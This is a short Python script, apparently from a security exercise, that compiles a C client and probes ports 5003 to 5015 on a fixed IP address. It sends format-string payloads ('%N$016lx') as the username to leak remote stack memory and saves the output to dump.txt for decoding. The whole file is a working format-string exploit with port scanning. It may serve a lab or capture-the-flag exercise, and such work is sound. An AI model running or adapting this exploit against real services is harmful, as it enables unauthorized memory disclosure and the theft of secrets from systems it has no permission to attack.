import os

PortNumber = 5003
IP = "202.141.30.3"
worked = False

# Compile client code
os.system("gcc client.c -o client")

while PortNumber <= 5015 and worked == False:
	for length in range(1, 30):

		username = "%" + str(length) + "$016lx"
		password = "unknown"
		
		file1 = open("input.txt", "w")
		file1.write(username + "\n" + password)
		file1.close()

		# Try with the current port number
		os.system("./client " + IP + " " + str(PortNumber) + " < input.txt > response.txt")
		
		file2 = open("response.txt", "r")
		s = file2.readline()
		file2.close()
		
		if(len(s) == 0):
			break
		else:
			if(worked == False):
				print("Connected to port " + str(PortNumber))
				print("Run DecodeHex.py to decode the file dump.txt")
			worked = True
			file1 = open("dump.txt", "a")
			file1.write(s + "\n")
			file1.close()
	PortNumber += 1
 
